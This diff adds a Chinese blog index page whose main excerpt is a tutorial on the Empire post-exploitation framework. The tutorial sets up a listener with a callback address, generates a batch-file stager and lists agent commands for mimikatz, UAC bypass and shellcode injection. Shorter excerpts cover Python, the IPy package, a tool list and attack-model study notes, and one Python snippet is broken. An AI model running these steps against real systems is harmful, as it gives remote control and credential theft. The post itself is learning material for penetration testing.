@@ -151,6 +151,1012 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Empire-后渗透测试工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/02/Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/">Empire-后渗透测试工具</a>
+    </h1>
+  
+
+        
+        <a href="/2020/11/02/Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" class="archive-article-date">
+  	<time datetime="2020-11-02T03:30:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire.git</span><br></pre></td></tr></table></figure>
+
+
+
+<p>各python模块安装</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">每次pip后都需要 sudo ./reset.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named xlutils.copy</span></span><br><span class="line">pip install xlutils</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named Crypto.Cipher</span></span><br><span class="line">pip install pycrypto</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">报错：ImportError: No module named pyminifier</span></span><br><span class="line">pip install pyminifier</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="安装M2Crypto"><a href="#安装M2Crypto" class="headerlink" title="安装M2Crypto"></a>安装M2Crypto</h4><p>若要<em>安装</em>M2Crypto，您必须能够根据 Python 和 OpenSSL 标头/库编译和链接 C 源。例如，在基于 Debian 的系统中，需要以下包：</p>
+<ul>
+<li><code>build-essential</code></li>
+<li><code>python3-dev</code>和/或<code>python-dev</code></li>
+<li><code>libssl-dev</code></li>
+<li><code>swig 2.0.4</code>或较新的（安装也可以在一些</li>
+</ul>
+<p>具有 swig v1.*的特定旧系统</p>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">agents            Jump to the Agents menu.</span><br><span class="line">creds             Add&#x2F;display credentials to&#x2F;from the database.</span><br><span class="line">exit              Exit Empire</span><br><span class="line">help              Displays the help menu.</span><br><span class="line">interact          Interact with a particular agent.</span><br><span class="line">list              Lists active agents or listeners.</span><br><span class="line">listeners         Interact with active listeners.</span><br><span class="line">load              Loads Empire modules from a non-standard folder.</span><br><span class="line">plugin            Load a plugin file to extend Empire.</span><br><span class="line">plugins           List all available and active plugins.</span><br><span class="line">preobfuscate      Preobfuscate PowerShell module_source files</span><br><span class="line">reload            Reload one (or all) Empire modules.</span><br><span class="line">report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log</span><br><span class="line">reset             Reset a global option (e.g. IP whitelists).</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">searchmodule      Search Empire module names&#x2F;descriptions.</span><br><span class="line">set               Set a global option (e.g. IP whitelists).</span><br><span class="line">show              Show a global option (e.g. IP whitelists).</span><br><span class="line">usemodule         Use an Empire module.</span><br><span class="line">usestager         Use an Empire stager.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="监听使用"><a href="#监听使用" class="headerlink" title="监听使用"></a>监听使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">(Empire)&gt;</span><span class="bash"> listeners     <span class="comment"># 监听</span></span></span><br><span class="line">(Empire: listeners) &gt; uselistener http   #选择监听方式</span><br><span class="line">(Empire: listeners/http) &gt; info     #查看需要配置的选项</span><br><span class="line">(Empire: listeners/http) &gt; set Name backdoor    #设置监听名字</span><br><span class="line">(Empire: listeners/http) &gt; set Host http://192.168.80.131:4447             #设置木马反弹回连地址</span><br><span class="line">(Empire: listeners/http) &gt; set Port 4447 #设置本地监听端口</span><br><span class="line">(Empire: listeners/http) &gt; back #返回上层模块</span><br><span class="line">(Empire: listeners) &gt; usestager windows/launcher_bat backdoor  # 选择木马种类</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; info     #查看需要配置的 -----可以set OutFile 到你指定的目录（绝对路径）</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; execute  #执行生成木马</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; agents   #查看获取的代理会话</span><br><span class="line">(Empire: agents) &gt; rename HZFT7AX1 win7pro #更改会话名字</span><br><span class="line">(Empire: agents) &gt; interact win7pro    #和该会话交互</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="监听器部分"><a href="#监听器部分" class="headerlink" title="监听器部分"></a>监听器部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101170327608.png" alt="image-20201101170327608"></p>
+<h3 id="木马生成部分"><a href="#木马生成部分" class="headerlink" title="木马生成部分"></a>木马生成部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101171314995.png" alt="image-20201101171314995"></p>
+<h3 id="木马监听部分"><a href="#木马监听部分" class="headerlink" title="木马监听部分"></a>木马监听部分</h3><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101183922578.png" alt="image-20201101183922578"></p>
+<h3 id="会话交互"><a href="#会话交互" class="headerlink" title="会话交互"></a>会话交互</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rename  E8FSHDVY win10  <span class="comment">#修改会话名称</span></span><br><span class="line">interact win10 <span class="comment">#进入会话交互</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101184218822.png" alt="image-20201101184218822"></p>
+<h3 id="会话交互帮助"><a href="#会话交互帮助" class="headerlink" title="会话交互帮助"></a>会话交互帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(Empire: win10) &gt; help</span><br><span class="line"></span><br><span class="line">Agent Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">agents            Jump to the agents menu.</span><br><span class="line">back              Go back a menu.</span><br><span class="line">bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn &lt;listener&gt;</span><br><span class="line">clear             Clear out agent tasking.</span><br><span class="line">creds             Display&#x2F;return credentials from the database.</span><br><span class="line">download          Task an agent to download a file.</span><br><span class="line">exit              Task agent to exit.</span><br><span class="line">help              Displays the help menu or syntax for particular commands.</span><br><span class="line">info              Display information about this agent</span><br><span class="line">injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode &lt;meter_listener&gt; &lt;pid&gt;</span><br><span class="line">jobs              Return jobs or kill a running job.</span><br><span class="line">kill              Task an agent to kill a particular process name or ID.</span><br><span class="line">killdate          Get or set an agent&#39;s killdate (01&#x2F;01&#x2F;2016).</span><br><span class="line">list              Lists all active agents (or listeners).</span><br><span class="line">listeners         Jump to the listeners menu.</span><br><span class="line">lostlimit         Task an agent to change the limit on lost agent detection</span><br><span class="line">main              Go back to the main menu.</span><br><span class="line">mimikatz          Runs Invoke-Mimikatz on the client.</span><br><span class="line">psinject          Inject a launcher into a remote process. Ex. psinject &lt;listener&gt; &lt;pid&#x2F;process_name&gt;</span><br><span class="line">pth               Executes PTH for a CredID through Mimikatz.</span><br><span class="line">rename            Rename the agent.</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">revtoself         Uses credentials&#x2F;tokens to revert token privileges.</span><br><span class="line">sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]</span><br><span class="line">scriptcmd         Execute a function in the currently imported PowerShell script.</span><br><span class="line">scriptimport      Imports a PowerShell script and keeps it in memory in the agent.</span><br><span class="line">searchmodule      Search Empire module names&#x2F;descriptions.</span><br><span class="line">shell             Task an agent to use a shell command.</span><br><span class="line">shinject          Inject non-meterpreter listener shellcode into a remote process. Ex. shinject &lt;listener&gt; &lt;pid&gt;</span><br><span class="line">sleep             Task an agent to &#39;sleep interval [jitter]&#39;</span><br><span class="line">spawn             Spawns a new Empire agent for the given listener name. Ex. spawn &lt;listener&gt;</span><br><span class="line">steal_token       Uses credentials&#x2F;tokens to impersonate a token for a given process ID.</span><br><span class="line">sysinfo           Task an agent to get system information.</span><br><span class="line">updatecomms       Dynamically update the agent comms to another listener</span><br><span class="line">updateprofile     Update an agent connection profile.</span><br><span class="line">upload            Task an agent to upload a file.</span><br><span class="line">usemodule         Use an Empire PowerShell module.</span><br><span class="line">workinghours      Get or set an agent&#39;s working hours (9:00-17:00).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="模块（module）相关"><a href="#模块（module）相关" class="headerlink" title="模块（module）相关"></a>模块（module）相关</h2><p>usemodule 空格加两下 tab 可查看全部模块</p>
+<h4 id="信息收集模块"><a href="#信息收集模块" class="headerlink" title="信息收集模块"></a>信息收集模块</h4><p><code>usemodule collection</code></p>
+<h4 id="提权模块"><a href="#提权模块" class="headerlink" title="提权模块"></a>提权模块</h4><p><code>usemodule privesc/bypassuac </code></p>
+<p>bypassuac 提权模块【前带 * 号的就是高权限已经提权成功的 shell】</p>
+<h4 id="信息收集模块-1"><a href="#信息收集模块-1" class="headerlink" title="信息收集模块"></a>信息收集模块</h4><p><code>usemodule collection</code></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">工具、后渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/11/02/Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-python-字符串切片、切割" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/31/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%87%E7%89%87%E3%80%81%E5%88%87%E5%89%B2/">python-字符串切片、切割</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/31/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%87%E7%89%87%E3%80%81%E5%88%87%E5%89%B2/" class="archive-article-date">
+  	<time datetime="2020-10-31T02:17:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>写IP地址类型转换,将多种IP段表达类型转换为地址列表</p>
+<p>因为192.168.160.1-222这种,要进行分割</p>
+<p>使用split方法进行分割</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="string">&quot;192.168.1.1-245&quot;</span></span><br><span class="line">ip = str.split(<span class="string">&#x27;.&#x27;</span>)    <span class="comment"># 以点为标记分割str字符串，并保存到列表</span></span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/31/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%87%E7%89%87%E3%80%81%E5%88%87%E5%89%B2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python-IPy包" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/30/Python-IPy%E5%8C%85/">Python-IPy包</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/30/Python-IPy%E5%8C%85/" class="archive-article-date">
+  	<time datetime="2020-10-30T13:30:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pip</span> install IPy</span><br></pre></td></tr></table></figure>
+
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>class and tools for handling of IPv4 and IPv6 addresses and networks.</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">编程</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/30/Python-IPy%E5%8C%85/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-奇奇怪怪的工具收集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/28/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/">奇奇怪怪的工具收集</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/28/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/" class="archive-article-date">
+  	<time datetime="2020-10-28T01:59:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="效率类"><a href="#效率类" class="headerlink" title="效率类"></a>效率类</h1><p><strong>Wox</strong>(windows)：可以用来替代win自带的搜索，能够兼容插件everything，可使用命令行</p>
+<p><strong>typora：</strong>MarkDown文本可视化编辑器</p>
+<p><strong>honeyview：</strong>图片查看工具</p>
+<p><strong>lily（免费）、Rolan（收费）：</strong>图标型快速启动工具</p>
+<p>**finalshell:**界面不错的shell工具</p>
+<h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p><strong>360驱动大师</strong>：可独立安装，虽然很奇怪，但它目前确实是最“干净”的驱动安装程序</p>
+<p>**cmder:**替代Cmd</p>
+<p>**Spaceketeer:**饼状图查看磁盘内文件空间占比（包含文件夹及多级目录），微软商店免费</p>
+<h1 id="文件类"><a href="#文件类" class="headerlink" title="文件类"></a>文件类</h1><p><strong>Beyond_Compare：</strong>文件夹、文件变化对比</p>
+<p>**FreePic2Pdf:**快速图片转PDF（可以文本导出PDF标签，可以带页码）</p>
+<h1 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h1><p><strong>clamav:</strong> linux下比较常见的杀毒工具</p>
+<h2 id="资产扫描"><a href="#资产扫描" class="headerlink" title="资产扫描"></a>资产扫描</h2><p><strong>goby：</strong>资产扫描及识别</p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p><strong>Elastic Stack (ELK Stack)</strong></p>
+<p>Elastic Stack，通常称为 ELK Stack，是需要筛选大量数据并理解其日志系统的组织中最受欢迎的开源工具之一（这也是我个人的最爱）。<br>它的主要产品由三个独立的产品组成：Elasticsearch、Kibana 和 Logstash：</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/28/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Pic-Go使用记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/22/Pic-Go%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">Pic-Go使用记录</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/22/Pic-Go%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2020-10-22T02:04:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/22/Pic-Go%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-信息安全工程师学习笔记-第二章" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%BA%8C%E7%AB%A0/">信息安全工程师学习笔记-第二章</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%BA%8C%E7%AB%A0/" class="archive-article-date">
+  	<time datetime="2020-10-21T08:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="网络攻击原理与常用方法"><a href="#网络攻击原理与常用方法" class="headerlink" title="网络攻击原理与常用方法"></a>网络攻击原理与常用方法</h1><h2 id="网络攻击概念"><a href="#网络攻击概念" class="headerlink" title="网络攻击概念"></a>网络攻击概念</h2><p>网络攻击是指损害网络系统安全属性的危害行为。危害行为导致网络系统的（网络安全基本属性）遭到不同程度的破坏</p>
+<p>网络攻击常见的有四种基本类型</p>
+<ol>
+<li>信息泄露攻击</li>
+<li>完整性破坏攻击</li>
+<li>拒绝服务攻击</li>
+<li>非法使用攻击</li>
+</ol>
+<p><strong>网络攻击原理</strong></p>
+<p>攻击者-&gt;攻击工具&gt;攻击访问&gt;攻击效果&gt;攻击意图。</p>
+<h2 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h2><h3 id="攻击树模型"><a href="#攻击树模型" class="headerlink" title="攻击树模型"></a>攻击树模型</h3><h3 id="MITRE-ATT-amp-CK模型"><a href="#MITRE-ATT-amp-CK模型" class="headerlink" title="MITRE ATT&amp;CK模型"></a><strong>MITRE ATT&amp;CK模型</strong></h3><p>MITRE依据真实观察到的攻击活动，将网络攻击数据提炼形成攻击矩阵模型MITRE ATT&amp;CK，该模型将攻击或从抽象为：</p>
+<blockquote>
+<ul>
+<li>初始访问(Initial Access)</li>
+<li>执行(Execution)</li>
+<li>持久化(Persistence)</li>
+<li>特权提升(Privilege Escalation)</li>
+<li>躲避防御(Defense Evasion)</li>
+<li>凭据访问(Credential Access)</li>
+<li>发现(Discovery)</li>
+<li>横向移动(Lateral MoveMent)</li>
+<li>收集(Collection)</li>
+<li>指挥和控制(Command and Control)</li>
+<li>外泄(Exfiltration)</li>
+<li>影响(Impact)</li>
+</ul>
+</blockquote>
+<p>然后给出攻击活动的具体实现方式</p>
+<h3 id="网络杀伤链-KILL-CHAIN-模型"><a href="#网络杀伤链-KILL-CHAIN-模型" class="headerlink" title="网络杀伤链(KILL CHAIN)模型"></a>网络杀伤链(KILL CHAIN)模型</h3><blockquote>
+<ul>
+<li>目标侦察</li>
+<li>武器构造</li>
+<li>载荷投送</li>
+<li>漏洞利用</li>
+<li>安装植入</li>
+<li>指挥控制</li>
+<li>目标行动</li>
+</ul>
+</blockquote>
+<h2 id="网络攻击发展"><a href="#网络攻击发展" class="headerlink" title="网络攻击发展"></a>网络攻击发展</h2><ul>
+<li>网络攻击工具智能化,自动化</li>
+<li>网络攻击者群体普适化</li>
+<li>网络攻击目标多样化和隐蔽性</li>
+<li>网络攻击计算资源获取方便</li>
+<li>网络攻击活动持续性强化</li>
+<li>网络攻击速度加快</li>
+<li>网络攻击影响扩大</li>
+<li>网络攻击主体组织化</li>
+</ul>
+<h2 id="网络攻击一般过程"><a href="#网络攻击一般过程" class="headerlink" title="网络攻击一般过程"></a>网络攻击一般过程</h2><ol>
+<li>隐蔽攻击源</li>
+<li>收集攻击目标信息</li>
+<li>挖掘漏洞信息</li>
+<li>获取目标访问权限</li>
+<li>隐蔽攻击行为</li>
+<li>实施攻击</li>
+<li>开辟后门</li>
+<li>清除攻击痕迹</li>
+</ol>
+<h2 id="网络攻击常见的技术方法"><a href="#网络攻击常见的技术方法" class="headerlink" title="网络攻击常见的技术方法"></a>网络攻击常见的技术方法</h2><ol>
+<li>端口扫描</li>
+<li>口令破解</li>
+<li>缓存区溢出</li>
+<li>恶意代码</li>
+<li>拒绝服务</li>
+<li>网络钓鱼</li>
+<li>网络窃听</li>
+<li>SQL注入</li>
+<li>社会工程学</li>
+<li>电子监听</li>
+<li>会话劫持<ol>
+<li>Tcp会话劫持</li>
+</ol>
+</li>
+<li>代理技术</li>
+<li>数据加密</li>
+</ol>
+<h2 id="黑客常用工具"><a href="#黑客常用工具" class="headerlink" title="黑客常用工具"></a>黑客常用工具</h2><ol>
+<li>扫描器</li>
+<li>远程监控</li>
+<li>密码破解</li>
+<li>网络嗅探器</li>
+<li>安全渗透测试工具箱</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
